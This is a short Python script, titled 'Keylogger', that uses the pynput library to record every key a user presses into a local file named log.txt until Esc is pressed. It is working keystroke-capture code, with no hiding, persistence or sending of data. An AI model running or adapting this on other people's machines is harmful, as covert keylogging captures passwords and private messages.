# Keylogger
# Log keys pressed by user into a file

import pynput
from pynput.keyboard import Key, Listener

# Clear text file
file = open("log.txt", "w+")
file.truncate(0)
file.close()

def on_press(key):
    write_file(key)

def write_file(key):
    
    # Create/open text file
    with open("log.txt", "a") as f:
        
        # Write newline for enter key
        if(str(key).find("enter") > 0):
            f.write("\n")

        # Write space for space and backspace keys
        if(str(key).find("space") > 0):
            f.write(" ")
        
        # Write only legible keys
        if(str(key).find("Key") == -1):    
            f.write(str(key).replace("'", ""))             
        
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
